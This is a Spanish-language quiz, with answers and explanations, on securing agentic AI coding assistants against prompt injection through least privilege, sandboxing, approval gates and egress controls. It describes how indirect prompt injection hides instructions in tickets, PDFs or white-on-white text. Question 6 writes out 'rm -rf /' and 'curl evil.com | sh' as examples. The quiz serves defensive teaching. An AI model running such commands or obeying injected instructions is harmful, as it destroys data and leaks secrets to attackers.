# Quiz: Asegurando Toolchains Agénticas

Tu equipo despliega un asistente de código con IA que puede leer repositorios, ejecutar herramientas y abrir pull requests. Quieres prevenir prompt injection, reducir el blast radius y mantener las acciones de alto riesgo bajo control humano sin bloquear la productividad diaria.

---

**1. ¿Cuál es el primer paso más útil en un threat model para una toolchain agéntica?**

- Elegir el modelo con la latencia más baja.
- **Listar los activos y las fronteras de confianza a las que la herramienta puede acceder.**
- Deshabilitar todas las tools para que no ocurran acciones.
- Escribir una política de seguridad genérica sin mapear pasos del workflow.

**Explicación:** los activos definen qué necesita protección y las fronteras definen por dónde entra el riesgo. Sin ese inventario, cualquier política posterior es abstracta: estarías asegurando algo que no sabes qué es ni dónde está expuesto. El OWASP LLM Top 10 y los frameworks como STRIDE ambos arrancan por *asset inventory + trust boundaries* por esta razón.

---

**2. ¿Qué estrategia de permisos reduce mejor el riesgo manteniendo la utilidad del tool?**

- Otorgar acceso total al repo y a la red por conveniencia.
- **Otorgar los scopes mínimos y expandir solo con aprobaciones explícitas.**
- Dar acceso amplio en desarrollo y restringir solo en producción.
- Usar los prompts como única salvaguarda.

**Explicación:** el principio de mínimo privilegio (Saltzer & Schroeder, 1975) combinado con rutas de escalación por aprobación da flexibilidad segura. Los prompts son manipulables por prompt injection; los permisos se enforcan a nivel de sistema. Separar permisos por entorno no basta porque un error en dev con credenciales de prod sigue causando incidente productivo.

---

**3. ¿Qué hace especialmente peligrosa a la prompt injection indirecta?**

- Proviene únicamente de páginas web externas.
- **Oculta instrucciones dentro de datos que el modelo trata como confiables.**
- Requiere prompts avanzados de jailbreak para tener éxito.
- Es un riesgo solo para chatbots de consumo.

**Explicación:** la inyección indirecta funciona porque el modelo no distingue entre instrucción y dato cuando ambos entran por el mismo canal de contexto. Un ticket interno, un wiki, un PDF o incluso una imagen con texto blanco sobre blanco pueden transportar instrucciones hostiles. Es LLM01 del OWASP Top 10 y la vulnerabilidad #1 de agentes con tools, totalmente independiente de jailbreaks del modelo base.

---

**4. ¿Qué defensa reduce mejor el riesgo de prompt injection indirecta?**

- **Tratar el texto recuperado como datos no confiables y separarlo de las instrucciones.**
- Aumentar la temperatura del modelo para mayor creatividad.
- Deshabilitar permanentemente todo retrieval.
- Confiar solo en revisión humana después de que la tool actúe.

**Explicación:** la separación instrucción/datos (vía etiquetado explícito `<untrusted>`, canales estructurados o provenance tagging) impide que contenido no confiable se interprete como instrucción. Es un control de diseño del sistema, no del modelo. Confiar solo en review post-hoc es *detect*, no *prevent*: para cuando el humano revisa, el token ya fue filtrado.

---

**5. ¿Qué acción amerita claramente un approval gate?**

- Formatear código para cumplir reglas de lint.
- **Añadir una dependencia nueva por conveniencia.**
- Renombrar una variable local en un test.
- Actualizar comentarios en documentación.

**Explicación:** añadir una dependencia es una decisión de seguridad y mantenimiento: afecta la superficie de ataque (supply chain), introduce código de terceros, cambia la licencia efectiva y puede traer CVEs. Es también vector típico de typosquatting y dependency confusion. Las otras opciones son cambios de bajo riesgo que no justifican la fricción de un gate humano.

---

**6. ¿Cuál es el propósito principal de sandboxing para agentes con tools?**

- Hacer al modelo más preciso.
- **Reducir el blast radius de errores o acciones maliciosas.**
- Reemplazar la revisión de código.
- Permitir acceso irrestricto a la red.

**Explicación:** sandboxing es contención: limita filesystem, red, procesos y recursos, de modo que incluso si el modelo genera un `rm -rf /` o un `curl evil.com | sh`, el daño queda confinado a un entorno efímero y descartable. No mejora al modelo ni sustituye revisión humana; es la última línea de defensa cuando prompts, permisos y validación fallan.

---

**7. ¿Por qué son importantes los egress controls en toolchains agénticas?**

- Evitan que sitios externos aparezcan en resultados de búsqueda.
- **Reducen la probabilidad de exfiltración de datos si la tool es comprometida.**
- Hacen que el modelo genere salidas más cortas.
- Mejoran la consistencia del formateo de código.

**Explicación:** la *lethal trifecta* (Simon Willison) describe el riesgo: datos privados + input no confiable + salida externa = exfiltración garantizada. Bloquear egress por default y permitir solo dominios internos específicos rompe la tercera pata, de modo que incluso con prompt injection exitoso y datos sensibles en contexto, el atacante no tiene canal para recibir la data. Es defense in depth puro: el ataque puede ocurrir, pero no logra su objetivo.
